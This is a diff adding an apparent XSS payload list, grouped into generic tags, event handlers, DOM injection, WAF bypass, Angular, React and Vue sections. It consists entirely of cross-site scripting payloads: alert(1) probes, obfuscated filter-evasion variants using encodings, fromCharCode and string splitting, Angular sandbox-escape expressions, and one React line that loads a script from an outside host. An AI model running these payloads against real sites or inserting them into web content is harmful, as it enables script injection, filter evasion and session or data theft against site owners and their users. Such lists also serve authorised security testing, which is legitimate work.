@@ -1,0 +1,655 @@
+[GENERIC] <script>alert(1)</script>
+[GENERIC] <script src=data:,alert(1)></script>
+[GENERIC] <script>eval(atob("YWxlcnQoMSk="))</script>
+[GENERIC] <img src=x onerror=alert(1)>
+[GENERIC] <img src=x:alert(1) onerror=eval(src)>
+[GENERIC] <svg onload=alert(1)>
+[GENERIC] <svg/onload=alert(1)>
+[GENERIC] <iframe src="javascript:alert(1)">
+[GENERIC] <iframe srcdoc="<img src=x onerror=alert(1)>">
+[GENERIC] <body onload=alert(1)>
+[GENERIC] <object data="javascript:alert(1)">
+[GENERIC] <embed src="javascript:alert(1)">
+[GENERIC] <math><mi xlink:href="data:x/x,<script>alert(1)</script>"></mi></math>
+[GENERIC] <video src=x onerror=alert(1)></video>
+[GENERIC] <audio src=x onerror=alert(1)></audio>
+[GENERIC] <details open ontoggle=alert(1)>
+[GENERIC] <marquee onstart=alert(1)>
+[GENERIC] <a href="javascript:alert(1)">Click</a>
+[GENERIC] <form action="javascript:alert(1)"><input type=submit>
+[GENERIC] <isindex action="javascript:alert(1)" type=image>
+[GENERIC] <base href="javascript:alert(1)//">
+[GENERIC] <bgsound src="javascript:alert(1)">
+[GENERIC] <link rel="stylesheet" href="javascript:alert(1)">
+[GENERIC] <style>@import 'javascript:alert(1)';</style>
+[GENERIC] <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[GENERIC] <applet code="javascript:alert(1)"></applet>
+[GENERIC] <object type="text/x-scriptlet" data="javascript:alert(1)"></object>
+[GENERIC] <template><script>alert(1)</script></template>
+[GENERIC] <table background="javascript:alert(1)">
+[GENERIC] <td background="javascript:alert(1)">
+[GENERIC] <div style="background-image: url(javascript:alert(1))">
+[GENERIC] <keygen autofocus onfocus=alert(1)>
+[GENERIC] <frameset><frame src="javascript:alert(1)"></frameset>
+[GENERIC] <input type="image" src="x" onerror="alert(1)">
+[GENERIC] <button formaction="javascript:alert(1)">X</button>
+[GENERIC] <source src="javascript:alert(1)">
+[GENERIC] <track default src="javascript:alert(1)">
+[GENERIC] <svg><script>alert(1)</script></svg>
+[GENERIC] <svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="1000" height="1000" fill="white"/></a></svg>
+[GENERIC] <math><a xlink:href="javascript:alert(1)">Click</a></math>
+[GENERIC] <picture><source srcset="x" onerror="alert(1)"><img src="x"></picture>
+[GENERIC] <map><area href="javascript:alert(1)" shape="default"></map>
+[GENERIC] <style>body{background:url("javascript:alert(1)")}</style>
+[GENERIC] <xmp><script>alert(1)</script></xmp>
+[GENERIC] <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+[GENERIC] <noembed><img src=x onerror=alert(1)></noembed>
+[GENERIC] <noframes><img src=x onerror=alert(1)></noframes>
+[GENERIC] <title></title><script>alert(1)</script>
+[GENERIC] <textarea></textarea><script>alert(1)</script>
+[GENERIC] <style></style><script>alert(1)</script>
+[GENERIC] <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+[GENERIC] <embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></embed>
+[GENERIC] <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+[GENERIC] <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">X</a>
+[GENERIC] <form action="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><button>X</button></form>
+[GENERIC] <svg><animate attributeName="href" values="javascript:alert(1)"></svg>
+[GENERIC] <svg><set attributeName="onmouseover" to="alert(1)"></svg>
+[GENERIC] <svg><animateTransform attributeName="onmousemove" to="alert(1)"></svg>
+[GENERIC] <svg><animateColor attributeName="onfocus" to="alert(1)"></svg>
+[GENERIC] <dialog open onclose=alert(1)><form method="dialog"><button>X</button></form></dialog>
+[GENERIC] <body onpageshow=alert(1)>
+[GENERIC] <body onpagehide=alert(1)>
+[GENERIC] <body onbeforeunload=alert(1)>
+[GENERIC] <body onunload=alert(1)>
+[GENERIC] <body onhashchange=alert(1)>
+[GENERIC] <body onpopstate=alert(1)>
+[GENERIC] <body onresize=alert(1)>
+[GENERIC] <body onscroll=alert(1)>
+[GENERIC] <body ononline=alert(1)>
+[GENERIC] <body onoffline=alert(1)>
+[GENERIC] <body onmessage=alert(1)>
+[GENERIC] <body onstorage=alert(1)>
+[GENERIC] <div oncopy=alert(1)>
+[GENERIC] <div oncut=alert(1)>
+[GENERIC] <div onpaste=alert(1)>
+[GENERIC] <div oncontextmenu=alert(1)>
+[GENERIC] <input onsearch=alert(1) type="search">
+[GENERIC] <input oninvalid=alert(1) required>
+[GENERIC] <form onsubmit=alert(1)>
+[GENERIC] <form onreset=alert(1)>
+
+[EVENT_HANDLERS] <svg onload=alert(1)>
+[EVENT_HANDLERS] <img onerror=alert(1) src=x>
+[EVENT_HANDLERS] <body onload=alert(1)>
+[EVENT_HANDLERS] <iframe onload=alert(1)>
+[EVENT_HANDLERS] <style onload=alert(1)>
+[EVENT_HANDLERS] <link rel="stylesheet" href="x" onerror=alert(1)>
+[EVENT_HANDLERS] <object onerror=alert(1) data="x">
+[EVENT_HANDLERS] <script onerror=alert(1) src="x"></script>
+[EVENT_HANDLERS] <video onerror=alert(1) src=x>
+[EVENT_HANDLERS] <audio onerror=alert(1) src=x>
+[EVENT_HANDLERS] <input autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] <textarea autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] <select autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] <button autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] <a href="#" autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] <div tabindex=1 autofocus onfocus=alert(1)>
+[EVENT_HANDLERS] <details open ontoggle=alert(1)>
+[EVENT_HANDLERS] <marquee onstart=alert(1)>
+[EVENT_HANDLERS] <marquee onfinish=alert(1)>
+[EVENT_HANDLERS] <marquee onbounce=alert(1)>
+[EVENT_HANDLERS] <body onpageshow=alert(1)>
+[EVENT_HANDLERS] <body onpagehide=alert(1)>
+[EVENT_HANDLERS] <body onbeforeunload=alert(1)>
+[EVENT_HANDLERS] <body onhashchange=alert(1)>
+[EVENT_HANDLERS] <body onresize=alert(1)>
+[EVENT_HANDLERS] <body onscroll=alert(1)>
+[EVENT_HANDLERS] <div onscroll=alert(1) style="overflow:auto;height:1px;"><br><br><br><br></div>
+[EVENT_HANDLERS] <body onmessage=alert(1)>
+[EVENT_HANDLERS] <input type="search" onsearch=alert(1)>
+[EVENT_HANDLERS] <input type="text" value="x" onselect=alert(1)>
+[EVENT_HANDLERS] <textarea onselect=alert(1)>x</textarea>
+[EVENT_HANDLERS] <input type="text" oninput=alert(1)>
+[EVENT_HANDLERS] <textarea oninput=alert(1)>
+[EVENT_HANDLERS] <input type="text" onchange=alert(1)>
+[EVENT_HANDLERS] <textarea onchange=alert(1)>
+[EVENT_HANDLERS] <select onchange=alert(1)><option>1</option></select>
+[EVENT_HANDLERS] <form onsubmit=alert(1)>
+[EVENT_HANDLERS] <form onreset=alert(1)>
+[EVENT_HANDLERS] <input type="submit" onclick=alert(1)>
+[EVENT_HANDLERS] <button onclick=alert(1)>
+[EVENT_HANDLERS] <a href="#" onclick=alert(1)>
+[EVENT_HANDLERS] <div onclick=alert(1)>
+[EVENT_HANDLERS] <span onclick=alert(1)>
+[EVENT_HANDLERS] <div ondblclick=alert(1)>
+[EVENT_HANDLERS] <div onmousedown=alert(1)>
+[EVENT_HANDLERS] <div onmouseup=alert(1)>
+[EVENT_HANDLERS] <div onmouseover=alert(1)>
+[EVENT_HANDLERS] <div onmousemove=alert(1)>
+[EVENT_HANDLERS] <div onmouseout=alert(1)>
+[EVENT_HANDLERS] <div onmouseenter=alert(1)>
+[EVENT_HANDLERS] <div onmouseleave=alert(1)>
+[EVENT_HANDLERS] <div oncontextmenu=alert(1)>
+[EVENT_HANDLERS] <div onwheel=alert(1)>
+[EVENT_HANDLERS] <div onmousewheel=alert(1)>
+[EVENT_HANDLERS] <div onkeydown=alert(1)>
+[EVENT_HANDLERS] <div onkeyup=alert(1)>
+[EVENT_HANDLERS] <div onkeypress=alert(1)>
+[EVENT_HANDLERS] <div oncopy=alert(1)>
+[EVENT_HANDLERS] <div oncut=alert(1)>
+[EVENT_HANDLERS] <div onpaste=alert(1)>
+[EVENT_HANDLERS] <div ondrag=alert(1)>
+[EVENT_HANDLERS] <div ondragstart=alert(1)>
+[EVENT_HANDLERS] <div ondragend=alert(1)>
+[EVENT_HANDLERS] <div ondragenter=alert(1)>
+[EVENT_HANDLERS] <div ondragleave=alert(1)>
+[EVENT_HANDLERS] <div ondragover=alert(1)>
+[EVENT_HANDLERS] <div ondrop=alert(1)>
+[EVENT_HANDLERS] <input type="text" oninvalid=alert(1) required>
+[EVENT_HANDLERS] <video onplay=alert(1)>
+[EVENT_HANDLERS] <video onpause=alert(1)>
+[EVENT_HANDLERS] <video onvolumechange=alert(1)>
+[EVENT_HANDLERS] <video onwaiting=alert(1)>
+[EVENT_HANDLERS] <video onplaying=alert(1)>
+[EVENT_HANDLERS] <video onseeked=alert(1)>
+[EVENT_HANDLERS] <video onseeking=alert(1)>
+[EVENT_HANDLERS] <video ontimeupdate=alert(1)>
+[EVENT_HANDLERS] <video onended=alert(1)>
+[EVENT_HANDLERS] <audio onratechange=alert(1)>
+[EVENT_HANDLERS] <audio onsuspend=alert(1)>
+
+[DOM_XSS] ";alert(1);//
+[DOM_XSS] ';alert(1);//
+[DOM_XSS] \";alert(1);//
+[DOM_XSS] \';alert(1);//
+[DOM_XSS] "-alert(1)-"
+[DOM_XSS] '-alert(1)-'
+[DOM_XSS] \"-alert(1)//
+[DOM_XSS] \'-alert(1)//
+[DOM_XSS] </script><script>alert(1)</script>
+[DOM_XSS] ")</script><script>alert(1)</script>
+[DOM_XSS] ')</script><script>alert(1)</script>
+[DOM_XSS] "];alert(1);//
+[DOM_XSS] '];alert(1);//
+[DOM_XSS] "};alert(1);//
+[DOM_XSS] '};alert(1);//
+[DOM_XSS] `+alert(1)+`
+[DOM_XSS] ${alert(1)}
+[DOM_XSS] javascript:alert(1)
+[DOM_XSS] javascript:prompt(document.domain)
+[DOM_XSS] javascript:eval(atob('YWxlcnQoMSk='))
+[DOM_XSS] javascript:setTimeout('alert(1)',10)
+[DOM_XSS] javascript:setInterval('alert(1)',10)
+[DOM_XSS] javascript:document.write('<img src=x onerror=alert(1)>')
+[DOM_XSS] javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'
+[DOM_XSS] javascript:Function('alert(1)')()
+[DOM_XSS] javascript:window['al'+'ert'](1)
+[DOM_XSS] javascript:parent['al'+'ert'](1)
+[DOM_XSS] javascript:top['al'+'ert'](1)
+[DOM_XSS] javascript:this['al'+'ert'](1)
+[DOM_XSS] javascript:self['al'+'ert'](1)
+[DOM_XSS] #javascript:alert(1)
+[DOM_XSS] #<script>alert(1)</script>
+[DOM_XSS] #"><img src=x onerror=alert(1)>
+[DOM_XSS] ?returnUrl=javascript:alert(1)
+[DOM_XSS] ?redirect=javascript:alert(1)
+[DOM_XSS] ?next=javascript:alert(1)
+[DOM_XSS] ?url=javascript:alert(1)
+[DOM_XSS] ?callback=alert(1)
+[DOM_XSS] ?cb=alert(1)
+[DOM_XSS] ?jsonp=alert(1)
+[DOM_XSS] ?jsonp_callback=alert(1)
+[DOM_XSS] ?jsonp_cb=alert(1)
+[DOM_XSS] ?action=alert(1)
+[DOM_XSS] ?page=javascript:alert(1)
+[DOM_XSS] ?link=javascript:alert(1)
+[DOM_XSS] ?file=javascript:alert(1)
+[DOM_XSS] ?path=javascript:alert(1)
+[DOM_XSS] ?folder=javascript:alert(1)
+[DOM_XSS] ?dir=javascript:alert(1)
+[DOM_XSS] ?document=javascript:alert(1)
+[DOM_XSS] ?view=javascript:alert(1)
+[DOM_XSS] ?template=javascript:alert(1)
+[DOM_XSS] ?theme=javascript:alert(1)
+[DOM_XSS] ?style=javascript:alert(1)
+[DOM_XSS] ?css=javascript:alert(1)
+[DOM_XSS] ?script=javascript:alert(1)
+[DOM_XSS] ?js=javascript:alert(1)
+[DOM_XSS] ?config=javascript:alert(1)
+[DOM_XSS] ?setting=javascript:alert(1)
+[DOM_XSS] ?lang=javascript:alert(1)
+[DOM_XSS] ?locale=javascript:alert(1)
+[DOM_XSS] ?id=javascript:alert(1)
+[DOM_XSS] ?item=javascript:alert(1)
+[DOM_XSS] ?product=javascript:alert(1)
+[DOM_XSS] ?category=javascript:alert(1)
+[DOM_XSS] ?search=javascript:alert(1)
+[DOM_XSS] ?q=javascript:alert(1)
+[DOM_XSS] ?query=javascript:alert(1)
+[DOM_XSS] ?keyword=javascript:alert(1)
+[DOM_XSS] ?name=javascript:alert(1)
+[DOM_XSS] ?username=javascript:alert(1)
+[DOM_XSS] ?user=javascript:alert(1)
+[DOM_XSS] ?email=javascript:alert(1)
+[DOM_XSS] ?password=javascript:alert(1)
+[DOM_XSS] ?token=javascript:alert(1)
+[DOM_XSS] ?session=javascript:alert(1)
+[DOM_XSS] ?auth=javascript:alert(1)
+[DOM_XSS] ?key=javascript:alert(1)
+[DOM_XSS] ?hash=javascript:alert(1)
+[DOM_XSS] ?state=javascript:alert(1)
+
+[WAF_BYPASS] <ScRiPt>alert(1)</sCrIpT>
+[WAF_BYPASS] <sCrIpT>alert(1)</ScRiPt>
+[WAF_BYPASS] <SCRIPT>alert(1)</SCRIPT>
+[WAF_BYPASS] <scr<script>ipt>alert(1)</script>
+[WAF_BYPASS] <sc<script>ript>alert(1)</script>
+[WAF_BYPASS] %3Cscript%3Ealert(1)%3C%2Fscript%3E
+[WAF_BYPASS] %253Cscript%253Ealert(1)%253C%252Fscript%253E
+[WAF_BYPASS] <img/src=x onerror=alert(1)>
+[WAF_BYPASS] <svg/onload=alert(1)>
+[WAF_BYPASS] <body/onload=alert(1)>
+[WAF_BYPASS] <iframe/src="javascript:alert(1)">
+[WAF_BYPASS] <script/src=data:,alert(1)></script>
+[WAF_BYPASS] <img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
+[WAF_BYPASS] <svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
+[WAF_BYPASS] <iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">
+[WAF_BYPASS] <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">X</a>
+[WAF_BYPASS] <img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+[WAF_BYPASS] <svg onload=\u0061\u006c\u0065\u0072\u0074(1)>
+[WAF_BYPASS] <a href="javascript:alert(1)">X</a>
+[WAF_BYPASS] jAvAsCrIpT:alert(1)
+[WAF_BYPASS] JaVaScRiPt:alert(1)
+[WAF_BYPASS] javascript&colon;alert(1)
+[WAF_BYPASS] java%0ascript:alert(1)
+[WAF_BYPASS] java%09script:alert(1)
+[WAF_BYPASS] java%0dscript:alert(1)
+[WAF_BYPASS] java%00script:alert(1)
+[WAF_BYPASS] javascript://%250Aalert(1)
+[WAF_BYPASS] javascript://%0Aalert(1)
+[WAF_BYPASS] <a href="javas&#99;ript:alert(1)">Click</a>
+[WAF_BYPASS] <script>+-+-1-+-+alert(1)</script>
+[WAF_BYPASS] <body/onload=&lt;!--&gt;&#10alert(1)>
+[WAF_BYPASS] <img src=x onerror=alert`1`>
+[WAF_BYPASS] <svg onload=alert`1`>
+[WAF_BYPASS] <script>alert(1)</script
+[WAF_BYPASS] <img src=x onerror=alert(1)
+[WAF_BYPASS] <svg onload=alert(1)
+[WAF_BYPASS] <iframe src="javascript:alert(1)"
+[WAF_BYPASS] <img src=x onerror=alert(1)//>
+[WAF_BYPASS] <svg onload=alert(1)//>
+[WAF_BYPASS] <script>alert(1)<!--
+[WAF_BYPASS] <script>alert(1)//
+[WAF_BYPASS] <script>alert(1)/*
+[WAF_BYPASS] <img src=x onerror="alert(1)/*">
+[WAF_BYPASS] <svg onload="alert(1)/*">
+[WAF_BYPASS] <iframe src="javascript:alert(1)/*">
+[WAF_BYPASS] <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+[WAF_BYPASS] <img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[WAF_BYPASS] <svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[WAF_BYPASS] <script>setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+[WAF_BYPASS] <img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[WAF_BYPASS] <svg onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[WAF_BYPASS] <script>setInterval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+[WAF_BYPASS] <img src=x onerror=setInterval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[WAF_BYPASS] <svg onload=setInterval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[WAF_BYPASS] <script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>
+[WAF_BYPASS] <img src=x onerror=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>
+[WAF_BYPASS] <svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>
+[WAF_BYPASS] <script>document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)</script>
+[WAF_BYPASS] <img src=x onerror=document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)>
+[WAF_BYPASS] <svg onload=document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)>
+[WAF_BYPASS] <script>window['al'+'ert'](1)</script>
+[WAF_BYPASS] <img src=x onerror=window['al'+'ert'](1)>
+[WAF_BYPASS] <svg onload=window['al'+'ert'](1)>
+[WAF_BYPASS] <script>parent['al'+'ert'](1)</script>
+[WAF_BYPASS] <img src=x onerror=parent['al'+'ert'](1)>
+[WAF_BYPASS] <svg onload=parent['al'+'ert'](1)>
+[WAF_BYPASS] <script>top['al'+'ert'](1)</script>
+[WAF_BYPASS] <img src=x onerror=top['al'+'ert'](1)>
+[WAF_BYPASS] <svg onload=top['al'+'ert'](1)>
+[WAF_BYPASS] <script>this['al'+'ert'](1)</script>
+[WAF_BYPASS] <img src=x onerror=this['al'+'ert'](1)>
+[WAF_BYPASS] <svg onload=this['al'+'ert'](1)>
+[WAF_BYPASS] <script>self['al'+'ert'](1)</script>
+[WAF_BYPASS] <img src=x onerror=self['al'+'ert'](1)>
+[WAF_BYPASS] <svg onload=self['al'+'ert'](1)>
+[WAF_BYPASS] <script>Function('al'+'ert(1)')()</script>
+[WAF_BYPASS] <img src=x onerror=Function('al'+'ert(1)')()>
+[WAF_BYPASS] <svg onload=Function('al'+'ert(1)')()>
+[ANGULAR] {{constructor.constructor('alert(1)')()}}
+[ANGULAR] {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
+[ANGULAR] {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//')}}
+[ANGULAR] <b/ng-click=window.alert(1)>click me</b>
+[ANGULAR] <input ng-focus="$event.view.alert(1)">
+[ANGULAR] {{ $on.constructor('alert(1)')() }}
+[ANGULAR] <div ng-app ng-csp><textarea autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(1);"></textarea></div>
+[ANGULAR] {{a="a"["constructor"].prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}
+[ANGULAR] {{'a'[{toString:[].join,length:1,0:'__defineGetter__'}].call('a', 'x', 'alert(1)')}}
+[ANGULAR] {{$eval.constructor('alert(1)')()}}
+[ANGULAR] {{$on.constructor('alert(1)')()}}
+[ANGULAR] {{$emit.constructor('alert(1)')()}}
+[ANGULAR] {{$broadcast.constructor('alert(1)')()}}
+[ANGULAR] {{$watch.constructor('alert(1)')()}}
+[ANGULAR] {{$watchCollection.constructor('alert(1)')()}}
+[ANGULAR] {{$watchGroup.constructor('alert(1)')()}}
+[ANGULAR] {{$apply.constructor('alert(1)')()}}
+[ANGULAR] {{$applyAsync.constructor('alert(1)')()}}
+[ANGULAR] {{$evalAsync.constructor('alert(1)')()}}
+[ANGULAR] {{$destroy.constructor('alert(1)')()}}
+[ANGULAR] <a ng-href="javascript:alert(1)">Click</a>
+[ANGULAR] <img ng-src="javascript:alert(1)">
+[ANGULAR] <iframe ng-src="javascript:alert(1)">
+[ANGULAR] <form ng-submit="alert(1)"><button>X</button></form>
+[ANGULAR] <input ng-keyup="alert(1)">
+[ANGULAR] <input ng-keydown="alert(1)">
+[ANGULAR] <input ng-keypress="alert(1)">
+[ANGULAR] <input ng-change="alert(1)">
+[ANGULAR] <div ng-mouseover="alert(1)">X</div>
+[ANGULAR] <div ng-mouseenter="alert(1)">X</div>
+[ANGULAR] <div ng-mouseleave="alert(1)">X</div>
+[ANGULAR] <div ng-mousemove="alert(1)">X</div>
+[ANGULAR] <div ng-mouseout="alert(1)">X</div>
+[ANGULAR] <div ng-mousedown="alert(1)">X</div>
+[ANGULAR] <div ng-mouseup="alert(1)">X</div>
+[ANGULAR] <div ng-dblclick="alert(1)">X</div>
+[ANGULAR] <div ng-contextmenu="alert(1)">X</div>
+[ANGULAR] <div ng-paste="alert(1)">X</div>
+[ANGULAR] <div ng-copy="alert(1)">X</div>
+[ANGULAR] <div ng-cut="alert(1)">X</div>
+[ANGULAR] <div ng-drag="alert(1)">X</div>
+[ANGULAR] <div ng-dragstart="alert(1)">X</div>
+[ANGULAR] <div ng-dragend="alert(1)">X</div>
+[ANGULAR] <div ng-dragenter="alert(1)">X</div>
+[ANGULAR] <div ng-dragleave="alert(1)">X</div>
+[ANGULAR] <div ng-dragover="alert(1)">X</div>
+[ANGULAR] <div ng-drop="alert(1)">X</div>
+[ANGULAR] {{ [].pop.constructor('alert(1)')() }}
+[ANGULAR] {{ "".sub.call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")() }}
+[ANGULAR] {{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) }}
+[ANGULAR] {{ !valueOf.name ? "" : valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41) }}
+[ANGULAR] {{ "a".constructor.prototype.charAt=[].join; $eval("x=1} } };alert(1);//"); }}
+[ANGULAR] {{ 'a'[{toString:false,valueOf:[].join,length:1,0:'__defineGetter__'}].call('a','x','alert(1)') }}
+[ANGULAR] {{ _=({}).constructor.getOwnPropertyDescriptor(String.prototype,"match");_.value.constructor("alert(1)")() }}
+[ANGULAR] {{ ({}).constructor.getOwnPropertyDescriptor(String.prototype,"match").value.constructor("alert(1)")() }}
+[ANGULAR] {{ x = {'y':''.constructor.prototype}; x['y'].charAt=[].join; $eval('x=alert(1)'); }}
+[ANGULAR] {{ $control.constructor('alert(1)')() }}
+[ANGULAR] {{ $root.constructor('alert(1)')() }}
+[ANGULAR] {{ $parent.constructor('alert(1)')() }}
+[ANGULAR] {{ $id.constructor('alert(1)')() }}
+[ANGULAR] {{ $new.constructor('alert(1)')() }}
+[ANGULAR] {{ $transclude.constructor('alert(1)')() }}
+[ANGULAR] {{ $element.constructor('alert(1)')() }}
+[ANGULAR] {{ $attrs.constructor('alert(1)')() }}
+[ANGULAR] {{ $scope.constructor('alert(1)')() }}
+[ANGULAR] {{ $window.alert(1) }}
+[ANGULAR] {{ $document.alert(1) }}
+[ANGULAR] {{ $location.alert(1) }}
+[ANGULAR] {{ $timeout.constructor('alert(1)')() }}
+[ANGULAR] {{ $interval.constructor('alert(1)')() }}
+[ANGULAR] {{ $http.constructor('alert(1)')() }}
+[ANGULAR] {{ $q.constructor('alert(1)')() }}
+[ANGULAR] {{ $log.constructor('alert(1)')() }}
+[ANGULAR] {{ $parse.constructor('alert(1)')() }}
+[ANGULAR] {{ $compile.constructor('alert(1)')() }}
+[ANGULAR] {{ $interpolate.constructor('alert(1)')() }}
+[ANGULAR] {{ $templateCache.constructor('alert(1)')() }}
+[ANGULAR] {{ $templateRequest.constructor('alert(1)')() }}
+[ANGULAR] {{ $sce.constructor('alert(1)')() }}
+
+[REACT] javascript:alert(1)
+[REACT] data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+[REACT] ' onClick={alert(1)} '
+[REACT] " dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} "
+[REACT] javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.cania\';document.body.appendChild(a)')
+[REACT] jav&#x09;ascript:alert(1);
+[REACT] jav&#x0A;ascript:alert(1);
+[REACT] jav&#x0D;ascript:alert(1);
+[REACT] java%09script:alert(1)
+[REACT] java%0ascript:alert(1)
+[REACT] java%0dscript:alert(1)
+[REACT] javascript://%250Aalert(1)
+[REACT] javascript://%0Aalert(1)
+[REACT] <a href="javascript:alert(1)">Click</a>
+[REACT] <form action="javascript:alert(1)"><button>X</button></form>
+[REACT] <object data="javascript:alert(1)"></object>
+[REACT] <embed src="javascript:alert(1)"></embed>
+[REACT] <iframe src="javascript:alert(1)"></iframe>
+[REACT] <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+[REACT] <form action="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><button>X</button></form>
+[REACT] <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+[REACT] <embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+[REACT] <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+[REACT] ' onMouseOver={alert(1)} '
+[REACT] ' onFocus={alert(1)} '
+[REACT] ' onLoad={alert(1)} '
+[REACT] ' onError={alert(1)} '
+[REACT] " onMouseOver={alert(1)} "
+[REACT] " onFocus={alert(1)} "
+[REACT] " onLoad={alert(1)} "
+[REACT] " onError={alert(1)} "
+[REACT] ` onClick={alert(1)} `
+[REACT] ` onMouseOver={alert(1)} `
+[REACT] ` onFocus={alert(1)} `
+[REACT] ` onLoad={alert(1)} `
+[REACT] ` onError={alert(1)} `
+[REACT] ' dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} '
+[REACT] ` dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}} `
+[REACT] ' dangerouslySetInnerHTML={{__html: "<svg onload=alert(1)>"}} '
+[REACT] " dangerouslySetInnerHTML={{__html: '<svg onload=alert(1)>'}} "
+[REACT] ` dangerouslySetInnerHTML={{__html: "<svg onload=alert(1)>"}} `
+[REACT] ' dangerouslySetInnerHTML={{__html: "<iframe src=javascript:alert(1)>"}} '
+[REACT] " dangerouslySetInnerHTML={{__html: '<iframe src=javascript:alert(1)>'}} "
+[REACT] ` dangerouslySetInnerHTML={{__html: "<iframe src=javascript:alert(1)>"}} `
+[REACT] ' dangerouslySetInnerHTML={{__html: "<script>alert(1)</script>"}} '
+[REACT] " dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}} "
+[REACT] ` dangerouslySetInnerHTML={{__html: "<script>alert(1)</script>"}} `
+[REACT] javascript:window.alert(1)
+[REACT] javascript:parent.alert(1)
+[REACT] javascript:top.alert(1)
+[REACT] javascript:self.alert(1)
+[REACT] javascript:this.alert(1)
+[REACT] javascript:setTimeout('alert(1)',0)
+[REACT] javascript:setInterval('alert(1)',0)
+[REACT] javascript:eval(atob('YWxlcnQoMSk='))
+[REACT] javascript:document.write('<img src=x onerror=alert(1)>')
+[REACT] javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'
+[REACT] javascript:Function('alert(1)')()
+[REACT] javascript:window['al'+'ert'](1)
+[REACT] javascript:parent['al'+'ert'](1)
+[REACT] javascript:top['al'+'ert'](1)
+[REACT] javascript:this['al'+'ert'](1)
+[REACT] javascript:self['al'+'ert'](1)
+[REACT] javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+[REACT] javascript:setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)
+[REACT] javascript:setInterval(String.fromCharCode(97,108,101,114,116,40,49,41),0)
+[REACT] javascript:document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62))
+[REACT] javascript:document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)
+[REACT] {constructor.constructor('alert(1)')()}
+[REACT] {''.constructor.constructor('alert(1)')()}
+[REACT] {([]).constructor.constructor('alert(1)')()}
+[REACT] {(1).constructor.constructor('alert(1)')()}
+[REACT] {(false).constructor.constructor('alert(1)')()}
+[REACT] {({}).constructor.constructor('alert(1)')()}
+[REACT] {(/x/).constructor.constructor('alert(1)')()}
+
+[VUE] {{_vue.constructor('alert(1)')()}}
+[VUE] <div v-html="'<img src=x onerror=alert(1)>'"></div>
